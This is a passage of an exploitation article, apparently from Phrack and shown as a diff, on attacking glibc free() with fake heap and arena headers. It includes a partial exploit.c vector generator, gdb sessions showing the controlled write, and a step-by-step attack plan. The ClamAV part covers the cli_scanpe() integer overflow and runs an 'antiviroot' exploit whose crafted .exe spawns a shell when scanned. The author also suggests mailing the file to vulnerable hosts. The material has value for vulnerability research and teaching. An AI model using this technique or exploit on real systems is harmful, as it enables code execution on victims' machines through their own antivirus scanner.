+  /* Size of the third chunk (PREV_INUSE). */
+  *(unsigned long int *)&chunks[0] = 0x00000051;
+
+  /* Pointer to the fourth chunk. */
+  chunks = buffer + 10244 + 80 + 80;
+
+  /* Size of the fourth chunk (PREV_INUSE). */
+  *(unsigned long int *)&chunks[0] = 0x00000051;
+
+  write(1, buffer, 10244 + 80 + 80 + 4);
+  return;
+}
+--- snip ---
+
+--- snip ---
+$ gcc exploit.c -o exploit
+$ ./exploit > VECTOR
+$ gdb -q ./test
+(gdb) b _int_free
+Function "_int_free" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (_int_free) pending.
+(gdb) run 722 1024 < VECTOR
+Starting program: /home/huku/test 722 1024 < VECTOR
+[~] Allocated 1024 bytes at 0x804a008-0x804a408
+[~] Allocated 1024 bytes at 0x804a410-0x804a810
+[~] Allocated 1024 bytes at 0x804a818-0x804ac18
+...
+...
+[~] Allocated 1024 bytes at 0x80ffa90-0x80ffe90
+[~] Chunk 1 at 0x80ffe98-0x8100298
+[~] Chunk 2 at 0x81026a0
+[~] Chunk 3 at 0x81026f0
+[~] Chunk 4 at 0x8102740
+[~] Freeing 0x81026a0
+
+Breakpoint 1, _int_free (av=0x810000c, mem=0x81026a0) at malloc.c:4552
+4552      p = mem2chunk(mem);
+(gdb) print *av
+$1 = {mutex = 1, flags = 2, fastbins = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+0x0, 0x0, 0x0}, top = 0x8100000, last_remainder = 0x0, bins = {0x41414135,
+0x0 <repeats 253 times>}, 
+  binmap = {0, 0, 0, 0}, next = 0x0, system_mem = 4294967295,
+max_system_mem = 0}
+--- snip ---
+
+It seems that all the values for the arena named 'av', are in
+position.
+
+--- snip ---
+(gdb) cont
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+_int_free (av=0x810000c, mem=0x81026a0) at malloc.c:4698
+4698          fwd->bk = p;
+(gdb) print (void *)fwd
+$2 = (void *) 0x41414135
+(gdb) print (void *)fwd->bk
+Cannot access memory at address 0x41414141
+(gdb) print (void *)p      
+$3 = (void *) 0x8102698
+(gdb) x/4bx p
+0x8102698:      0xef    0xbe    0xad    0xde
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+--- snip ---
+
+Indeed, 'fwd->bk' is the return location (0x41414141) and 'p' is
+the return address (the address of the 'prev_size' of the second
+chunk). The attacker placed there the data 0xdeadbeef. So, it's now
+just a matter of placing the nops and the shellcode at the proper
+location. This is, of course, left as an exercise for the reader
+(the .dtors section is your friend) :-)
+
+
+
+---[ VII. Putting it all together
+
+It's now time to develop a logical plan of what some attacker is
+supposed to do in order to take advantage of such a security hole.
+Although it should be quite clear by now, the steps required for
+successful exploitation are listed below.
+
+* An attacker must force the program perform sequential allocations
+in the heap and eventually control a chunk whose boundaries contain
+the new theoretical heap address. For example, if allocations start
+at 0x080XXXXX then they should allocate chunks until the one they
+control contains the address 0x08100000 within its bounds. The
+chunks should be larger than 64 bytes but smaller than the mmap()
+threshold. If the target program has already performed several
+allocations, it is highly possible that allocations start at
+0x08100000.
+
+* An attacker must make sure that they can overflow the chunk right
+next to the one under their control. For example, if the chunk from
+0x080XXXXX to 0x08101000 is under control, then chunk 0x08101001-
+0x0810XXXX should be overflowable (or just any chunk at 0x081XXXXX).
+
+* A fake heap header followed by a fake arena header should be
+placed at 0x08100000. Their base addresses in the VA space are
+0x08100000 and 0x08100000 + sizeof(struct _heap_info) respectively.
+The bins[0] field of the fake arena header should be set equal to
+the return location minus 12 and the rules described in the previous
+section should be followed for better results. If there's enough
+room, one can also add nops and shellcode there, if not then
+imagination is the only solution (the contents of the following
+chunk are under the attacker's control as well).
+
+* A heap overflow should be forced via a memcpy(), bcopy(), read()
+or similar functions. The exploitation vector should be just like
+the one created by the code in the previous section. Schematically,
+it looks like the following figure (the pipe character indicates
+the chunk boundaries).
+
+[heap_hdr][arena_hdr][...]|[AAAA][...]|[BBBB][...]|[CCCC]
+
+  [heap_hdr] -> The fake heap header. It should be placed on an
+  address aligned to 1Mb e.g 0x08100000.
+
+  [arena_hdr] -> The fake arena header.
+
+  [...] -> Irrelevant data, garbage, alphas etc. If there's enough
+  room, one can place nops and shellcode here.
+
+  [AAAA] -> The size of the second chunk plus PREV_INUSE and
+  NON_MAIN_ARENA.
+
+  [BBBB] -> The size of the third chunk plus PREV_INUSE.
+
+  [CCCC] -> The size of the fourth chunk plus PREV_INUSE.
+
+* The attacker should be patient enough to wait until the chunk
+right next to the one she controls is freed. Voila!
+
+Although this technique can be quite lethal as well as straightforward,
+unfortunately it's not as generic as the heap overflows of the good
+old days. That is, when applied, it can achieve immediate and
+trustworthy results. However, it has a higher complexity than, for
+example, common stack overflows, thus certain prerequisites should
+be met before even someone attempts to deploy such an attack. More
+precisely, the following conditions should be true.
+
+* The target chunks should be larger than 64 bytes and less than
+the mmap() threshold.
+
+* An attacker must have the ability to control 4 sequential chunks
+either directly allocated or fake ones constructed by them.
+
+* An attacker must have the ability to write null bytes. That is,
+one should be able to overflow the chunks via memcpy(), bcopy(),
+read() or similar since strcpy() or strncpy() will not work! This
+is probably the most important precondition for this technique.
+
+
+---[ VIII. The ClamAV case 
+
+--[ 1. The bug
+
+Let's use the knowledge described so far to build a working exploit
+for a known application. After searching at secunia.com for heap
+overflows, I came up with a list of possible targets, the most
+notable one being ClamAV. The cli_scanpe() integer overflow was a
+really nice idea, so, I decided to research it a bit (the related
+advisory is published at [12]). The exploit code for this vulnerability,
+called 'antiviroot', can be found in the 'Attachments' section in
+uuencoded format.
+
+Before attempting to audit any piece of code, the potential attacker
+is advised to build ClamAV using a custom version of glibc with
+debugging symbols (I also modified glibc a bit to print various
+stuff). After following Chariton's ideas described at [11], one can
+build ClamAV using the commands of the following snippet. It is
+rather complicated but works fine. This trick is really useful if
+one is about to use gdb during the exploit development.
+
+--- snip ---
+$ export LDFLAGS=-L/home/huku/test_builds/lib -L/usr/local/lib -L/usr/lib
+$ export CFLAGS=-O0 -nostdinc \
+> -I/usr/lib/gcc/i686-pc-linux-gnu/4.2.2/include \
+> -I/home/huku/test_builds/include -I/usr/include -I/usr/local/include \
+> -Wl,-z,nodeflib \ 
+> -Wl,-rpath=/home/huku/test_builds/lib -B /home/huku/test_builds/lib \
+> -Wl,--dynamic-linker=/home/huku/test_builds/lib/ld-linux.so.2
+$ ./configure --prefix=/usr/local && make && make install
+--- snip ---
+
+When make has finished its job, we have to make sure everything is
+ok by running ldd on clamscan and checking the paths to the shared
+libraries.
+
+--- snip ---
+$ ldd /usr/local/bin/clamscan 
+ linux-gate.so.1 =>  (0xb7ef4000)
+ libclamav.so.2 => /usr/local/lib/libclamav.so.2 (0xb7e4e000)
+ libpthread.so.0 => /home/huku/test_builds/lib/libpthread.so.0 (0xb7e37000)
+ libc.so.6 => /home/huku/test_builds/lib/libc.so.6 (0xb7d08000)
+ libz.so.1 => /usr/lib/libz.so.1 (0xb7cf5000)
+ libbz2.so.1.0 => /usr/lib/libbz2.so.1.0 (0xb7ce5000)
+ libnsl.so.1 => /home/huku/test_builds/lib/libnsl.so.1 (0xb7cd0000)
+ /home/huku/test_builds/lib/ld-linux.so.2 (0xb7ef5000)
+--- snip ---
+
+Now let's focus on the buggy code. The actual vulnerability exists
+in the preprocessing of PE (Portable Executable) files, the well
+known Microsoft Windows executables. Precisely, when ClamAV attempts
+to dissect the headers produced by a famous packer, called MEW, an
+integer overflow occurs which later results in an exploitable
+condition. Notice that this bug can be exploited using various
+techniques but for demonstration purposes I'll stick to the one I
+presented here. In order to have a more clear insight on how things
+work, you are also advised to read the Microsoft PE/COFF specification
+[13] which, surprisingly, is free for download.
+
+Here's the vulnerable snippet, libclamav/pe.c function cli_scanpe().
+I actually simplified it a bit so that the exploitable part becomes
+more clear.
+
+--- snip ---
+ssize = exe_sections[i + 1].vsz;
+dsize = exe_sections[i].vsz;
+...
+
+src = cli_calloc(ssize + dsize, sizeof(char));
+...
+
+bytes = read(desc, src + dsize, exe_sections[i + 1].rsz);
+--- snip --
+
+First, 'ssize' and 'dsize' get their initial values which are
+controlled by the attacker. These values represent the virtual size
+of two contiguous sections of the PE file being scanned (don't try
+to delve into the MEW packer details since you won't find any
+documentation which will be useless even if you will). The sum of
+these user supplied values is used in cli_calloc() which, obviously,
+is just a calloc() wrapper. This allows for an arbitrary sized heap
+allocation, which can later be used in the read operation. There
+are endless scenarios here, but lets see what are the potentials
+of achieving code execution using the new free() exploitation
+technique.
+
+Several limitations that are imposed before the vulnerable snippet
+is reached, make the exploitation process overly complex (MEW fixed
+offsets, several bound checks on PE headers etc). Let's ignore them
+for now since they are only interesting for those who are willing
+to code an exploit of their own. What we are really interested in,
+is just the core idea behind this exploit.
+
+Since 'dsize' is added to 'src' in the read() operation, the attacker
+can give 'dsize' such a value, so that when added to 'src', the
+heap address of 'src' is eventually produced (via an integer
+overflow). Then, read(), places all the user supplied data there,
+which may contain specially crafted heap and arena headers, etc.
+So schematically, the situation looks like the following figure
+(assuming the 'src' pointer has a value of 0xdeadbeef):
+
+   0xdea00000                   0xdeadbeef
+...+----------+-----------+-...-+-------------+--------------+...
+   | Heap hdr | Arena hdr |     | Chunk 'src' | Other chunks |
+...+----------+-----------+-...-+-------------+--------------+...
+
+So, if one manages to overwrite the whole region, from the heap
+header to the 'src' chunk, then they can also overwrite the chunks
+neighboring 'src' and perform the technique presented earlier. But
+there are certain obstacles which can't be just ignored:
+
+* From 0xdea00000 to 0xdeadbeef various chunks may also be present,
+and overwriting this region may result in premature terminations
+of the ClamAV scan process.
+
+* 3 More chunks should be present right after the 'src' chunk and
+they should be also alterable by the overflow.
+
+* One needs the actual value of the 'src' pointer.
+
+Fortunately, there's a solution for each of them:
+
+* One can force ClamAV not to mess with the chunks between the heap
+header and the 'src' chunk. An attacker may achieve this by following
+a precise vulnerable path.
+
+* Unfortunately, due to the heap layout during the execution of the
+buggy code, there are no chunks right after 'src'. Even if there
+were, one wouldn't be able to reach them due to some internal size
+checks in the cli_scanpe() code. After some basic math calculations
+(not presented here since they are more or less trivial), one can
+prove that the only chunk they can overwrite is the chunk pointed
+by 'src'. Then, cli_calloc() can be forced to allocate such a chunk,
+where one can place 4 fake chunks of a size larger than 72. This
+is exactly the same situation as having 4 contiguous preallocated
+heap chunks! :-)
+
+* Since the heap is, by default, not randomized, one can precalculate
+the 'src' value using gdb or some custom malloc() debugger (just
+like I did). This specific bug is hard to exploit when randomization
+is enabled. On the contrary, the general technique presented in
+this article, is immune to such security measures.
+
+Optionally, an attacker can force ClamAV allocate the 'src' chunk
+somewhere inside a heap hole created by realloc() or free(). This
+allows for the placement of the target chunk some bytes closer to
+the fake heap and arena headers, which, in turn, may allow for
+bypassing certain bound checks. Before the vulnerable snippet is
+reached, the following piece of code is executed:
+
+--- snip ---
+section_hdr = (struct pe_image_section_hdr *)cli_calloc(nsections, 
+  sizeof(struct pe_image_section_hdr));
+...
+
+exe_sections = (struct cli_exe_section *)cli_calloc(nsections,
+  sizeof(struct cli_exe_section));
+...
+
+free(section_hdr);
+--- snip ---
+
+This creates a hole at the location of the 'section_hdr' chunk. By
+carefully computing values for 'dsize' and 'ssize' so that their
+sum equals the product of 'nsections' and 'sizeof(struct
+pe_image_section_hdr)', one can make cli_calloc() reclaim the heap
+hole and return it (this is what antiviroot actually does). Notice
+that apart from the aforementioned condition, the value of 'dsize'
+should be such, so that 'src + dsize' equals to the heap address
+of 'src' (a.k.a. 'heap_for_ptr(src)').
+
+Finally, in order to trigger the vulnerable path in malloc.c, a
+free() should be issued on the 'src' chunk. This should be performed
+as soon as possible, since the MEW unpacking code may mess with the
+contents of the heap and eventually break things. Hopefully, the
+following code can be triggered in the ClamAV source.
+
+--- snip ---
+if(buff[0x7b] == '\xe8') {
+  ...
+
+  if(!CLI_ISCONTAINED(exe_sections[1].rva, exe_sections[1].vsz,
+    cli_readint32(buff + 0x7c) + fileoffset + 0x80, 4)) {
+    ...
+
+    free(src);
+  }
+}
+--- snip ---
+
+By planting the value 0xe8 in offset 0x7b of 'buff' and by forcing
+CLI_ISCONTAINED() to fail, one can force ClamAV to call free() on
+the 'src' chunk (the chunk whose header contains the NON_MAIN_ARENA
+flag when the read() operation completes). A '4 bytes anywhere'
+condition eventually takes place. In order to prevent ClamAV from
+crashing on the next free(), one can overwrite the .got address of
+free() and wait.
+
+--[ 2. The exploit
+
+So, here's how the exploit for this ClamAV bug looks like. For more
+info on the exploit usage you can check the related README file in
+the attachment. This code creates a specially crafted .exe file,
+which, when passed to clamscan, spawns a shell.
+
+--- snip ---
+$ ./antiviroot -a 0x98142e0 -r 0x080541a8 -s 441
+CLAMAV 0.92.x cli_scanpe() EXPLOIT / antiviroot.c 
+huku / huku _at_ grhack _dot_ net
+
+[~] Using address=0x098142e0 retloc=0x080541a8 size=441 file=exploit.exe
+[~] Corrected size to 480
+[~] Chunk 0x098142e0 has real address 0x098142d8
+[~] Chunk 0x098142e0 belongs to heap 0x09800000
+[~] 0x098142d8-0x09800000 = 82648 bytes space (0.08M)
+[~] Calculating ssize and dsize
+[~] dsize=0xfffebd20 ssize=0x000144c0 size=480
+[~] addr=0x098142e0 + dsize=0xfffebd20 = 0x09800000 (should be 0x09800000)
+[~] dsize=0xfffebd20 + ssize=0x000144c0 = 480 (should be 480)
+[~] Available space for exploitation 488 bytes (0.48K)
+[~] Done
+$ /usr/local/bin/clamscan exploit.exe 
+LibClamAV Warning: **************************************************
+LibClamAV Warning: ***  The virus database is older than 7 days.  ***
+LibClamAV Warning: ***        Please update it IMMEDIATELY!       ***
+LibClamAV Warning: **************************************************
+...
+
+sh-3.2$ echo yo
+yo
+sh-3.2$ exit
+exit
+--- snip ---
+
+A more advanced scenario would be attaching the executable file and
+mailing it to a couple of vulnerable hosts and... KaBooM! Eventually,
+it seems that our technique is quite lethal even for real life
+scenarios. More advancements are possible, of course, they are left
+as an exercise to the reader :-)
+
+
+---[ IX. Epilogue 
+
+Personally, I belong with those who believe that the future of
+exploitation lies somewhere in kernelspace. The various userspace
+techniques are, like g463 said, more or less ephemeral. This paper
+was just the result of some fun I had with the glibc malloc()
+implementation, nothing more, nothing less.
+
+Anyway, all that stuff kinda exhausted me. I wouldn't have managed
+to write this article without the precious help of GM, eidimon and
+Slasher (yo guys!).
+
+Dedicated to the r00thell clique -- Wherever you are and whatever
+you do, I wish you guys (and girls ;-) all the best.
+
+
+---[ X. References
+
+[01] Vudo - An object superstitiously believed to embody magical powers 
+     Michel "MaXX" Kaempf <maxx@synnergy.net>
+     https://phrack.org/issues/57/8.html#article
+
+[02] Once upon a free()...
+     anonymous <d45a312a@author.phrack.org>
+     https://phrack.org/issues/57/9.html#article
+
+[03] Advanced Doug lea's malloc exploits
+     jp <jp@corest.com>
+     https://phrack.org/issues/61/6.html#article  
+
+[04] w00w00 on Heap Overflows
+     Matt Conover & w00w00 Security Team
+     http://www.w00w00.org/files/articles/heaptut.txt
+
+[05] Heap off by one
+     qitest1 <qitest1@bespin.org>
+     http://freeworld.thc.org/root/docs/exploit_writing/heap_off_by_one.txt
+
+[06] The Malloc Maleficarum
+     Phantasmal Phantasmagoria <phantasmal@hush.ai>
+     http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt
+
+[07] JPEG COM Marker Processing Vulnerability in Netscape Browsers
+     Solar Designer <solar@openwall.com>
+     http://www.openwall.com/advisories/OW-002-netscape-jpeg/
+
+[08] Glibc heap protection patch
+     Stefan Esser <stefan@suspekt.org>
+     http://seclists.org/focus-ids/2003/Dec/0024.html
+
+[09] Exploiting the Wilderness
+     Phantasmal Phantasmagoria <phantasmal@hush.ai> 
+     http://seclists.org/vuln-dev/2004/Feb/0025.html
+
+[10] The use of set_head to defeat the wilderness
+     g463 <jean-sebastien@guay-leroux.com>
+     https://phrack.org/issues/64/9.html#article
+
+[11] Two (or more?) glibc installations
+     Chariton Karamitas <chariton.karamitas@echothrust.com>
+     http://blogs.echothrust.com/chariton-karamitas/two-or-more-glibc-installations 
+
+[12] ClamAV Multiple Vulnerabilities 
+     Secunia Research 
+     http://secunia.com/advisories/28117/
+
+[13] Portable Executable and Common Object File Format Specification
+     Microsoft
+     http://www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx
+
+
+
+XI. Attachments
+
+--------[ EOF
